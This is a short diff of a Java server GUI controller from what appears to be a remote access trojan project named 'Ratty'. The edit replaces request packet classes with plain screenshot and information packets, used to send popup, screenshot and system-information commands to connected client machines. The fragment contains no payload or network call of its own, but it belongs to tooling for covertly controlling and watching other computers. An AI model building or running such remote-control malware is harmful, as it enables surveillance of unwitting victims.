@@ -8,8 +8,7 @@ import de.sogomn.rat.packet.FreePacket;
 import de.sogomn.rat.packet.IPacket;
 import de.sogomn.rat.packet.InformationPacket;
 import de.sogomn.rat.packet.PopupPacket;
-import de.sogomn.rat.packet.request.InformationRequestPacket;
-import de.sogomn.rat.packet.request.ScreenshotRequestPacket;
+import de.sogomn.rat.packet.ScreenshotPacket;
 import de.sogomn.rat.server.ActiveServer;
 import de.sogomn.rat.server.IServerObserver;
 
@@ -48,14 +47,13 @@ public final class ServerGuiController implements IServerObserver, IClientObserv
 		return null;
 	}
 	
-	/*HARDCODED ATM*/
 	private IPacket getPacket(final String actionCommand) {
 		if (actionCommand == RattyGui.POPUP) {
 			return PopupPacket.create();
 		} else if (actionCommand == RattyGui.FREE) {
 			return new FreePacket();
 		} else if (actionCommand == RattyGui.SCREENSHOT) {
-			return new ScreenshotRequestPacket();
+			return new ScreenshotPacket();
 		}
 		
 		return null;
@@ -106,7 +104,7 @@ public final class ServerGuiController implements IServerObserver, IClientObserv
 	public void addClient(final ActiveClient client) {
 		final long id = nextId++;
 		final ServerClient serverClient = new ServerClient(id, client);
-		final InformationRequestPacket packet = new InformationRequestPacket();
+		final InformationPacket packet = new InformationPacket();
 		
 		client.setObserver(this);
 		clients.add(serverClient);
